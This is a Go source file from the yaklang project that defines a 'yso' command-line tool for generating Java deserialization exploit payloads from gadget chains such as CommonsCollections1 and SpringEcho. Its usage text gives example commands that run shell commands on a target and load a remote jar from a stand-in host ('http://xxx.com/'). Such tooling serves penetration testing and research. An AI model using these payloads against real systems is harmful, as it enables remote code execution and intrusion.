package yakcmds

import (
	"fmt"
	"github.com/yaklang/yaklang/common/urfavecli"
	"github.com/yaklang/yaklang/common/log"
	"github.com/yaklang/yaklang/common/yak/yaklib/codec"
	"github.com/yaklang/yaklang/common/yso"
	"os"
	"strings"
)

var YsoCommands = []*cli.Command{}

func init() {
	YsoCommands = append(YsoCommands, createYsoCommand())
}
func createYsoCommand() *cli.Command {
	var gadgetNames []string
	for k, _ := range yso.YsoConfigInstance.Gadgets {
		gadgetNames = append(gadgetNames, string(k))
	}
	var classInfos []string
	for k, cfg := range yso.YsoConfigInstance.Classes {
		info := ""
		info += fmt.Sprintf("%s:%s\n", k, cfg.Desc)
		for _, param := range cfg.Params {
			info += fmt.Sprintf("\t%s:%s\n", param.Name, param.Desc)
		}
		classInfos = append(classInfos, info)
	}
	var transformChainInfos []string
	for k, cfg := range yso.YsoConfigInstance.ReflectChainFunction {
		info := ""
		info += fmt.Sprintf("%s:%s\n", k, cfg.Desc)
		for _, param := range cfg.Args {
			info += fmt.Sprintf("\t%s:%s\n", param.Name, param.Desc)
		}
		transformChainInfos = append(transformChainInfos, info)
	}
	command := &cli.Command{}
	command.Name = "yso"
	command.Description = "yak-yso 是一个用于生成 java payload 的命令行工具"
	command.UsageText = `format: yak yso [options] [gadget] [type] [params]
gadget、type、params是三个关键参数，gadget是指定的gadget名称，type是指定payload的用途，params是参数
如果是基于TemplateImpl实现的gadget，type的可选值为内置evil class名，params是class的参数，格式为key:value,key:value
如果是基于TransformChain实现的gadget，type的可选值为内置transform chain名，params是transform chain的参数，格式为key:value,key:value

`
	command.UsageText += fmt.Sprintf("all gadget:%s\n\n", strings.Join(gadgetNames, ","))
	command.UsageText += fmt.Sprintf("all class:\n%s\n", strings.Join(classInfos, ""))
	command.UsageText += fmt.Sprintf("all transform chain:\n%s\n", strings.Join(transformChainInfos, ""))
	command.UsageText += `example:
yak yso -b CommonsCollections1 raw_cmd "cmd:touch /tmp/flag"
yak yso -b CommonsCollections1 loadjar "url:http://xxx.com/,name:exp"
yak yso -b CommonsCollections2 SpringEcho "cmd:whoami,position:header"
`
	command.HelpName = "yak-yso"
	command.Flags = []cli.Flag{
		cli.BoolFlag{
			Name:  "base64,b",
			Usage: "以base64编码的形式输出payload",
		},
		cli.StringFlag{
			Name:  "output,o",
			Usage: "输出payload到指定文件",
		},
	}
	command.Action = func(c *cli.Context) {
		args := c.Args()
		gadget := args.Get(0)
		typ := args.Get(1)
		param := args.Get(2)
		if gadget == "" {
			log.Errorf("gadget name is required")
			return
		}
		var gadgetIns *yso.JavaObject
		cfg, ok := yso.YsoConfigInstance.Gadgets[yso.GadgetType(gadget)]
		if !ok {
			log.Errorf("not support gadget: %s", gadget)
			return
		}
		if cfg.IsTemplateImpl {
			var opts []yso.GenClassOptionFun
			paramItems := strings.Split(param, ",")
			for _, param := range paramItems {
				item := strings.Split(param, ":")
				if len(item) != 2 {
					log.Errorf("invalid class param: %s", param)
					continue
				}
				opts = append(opts, yso.SetClassParam(item[0], item[1]))
			}
			classIns, err := yso.GenerateClass(append(opts, yso.SetClassType(yso.ClassType(typ)))...)
			if err != nil {
				log.Errorf("generate class failed: %s", err)
				return
			}
			classBytes, err := yso.ToBytes(classIns)
			if err != nil {
				log.Errorf("generate bytes failed: %s", err)
				return
			}
			tmpGadgetIns, err := yso.GenerateGadget(gadget, yso.SetClassBytes(classBytes))
			if err != nil {
				log.Errorf("generate gadget failed: %s", err)
				return
			}
			gadgetIns = tmpGadgetIns
		} else {
			command := param
			if command == "" {
				log.Errorf("command is required")
				return
			}
			optsMap := make(map[string]string)
			paramItems := strings.Split(param, ",")
			for _, param := range paramItems {
				item := strings.Split(param, ":")
				if len(item) != 2 {
					log.Errorf("invalid transform chain param: %s", param)
					continue
				}
				optsMap[item[0]] = item[1]
			}
			tmpGadgetIns, err := yso.GenerateGadget(gadget, typ, optsMap)
			if err != nil {
				log.Errorf("generate gadget failed: %s", err)
				return
			}
			gadgetIns = tmpGadgetIns
		}
		bs, err := yso.ToBytes(gadgetIns)
		if err != nil {
			log.Errorf("generate bytes failed: %s", err)
			return
		}
		if c.String("output") != "" {
			err := os.WriteFile(c.String("output"), bs, 0644)
			if err != nil {
				log.Errorf("write to file failed: %s", err)
				return
			}
			log.Infof("write to file: %s", c.String("output"))
			return
		}
		if c.IsSet("base64") {
			println(codec.EncodeBase64(bs))
			return
		}
		os.Stdout.Write(bs)
	}
	return command
}
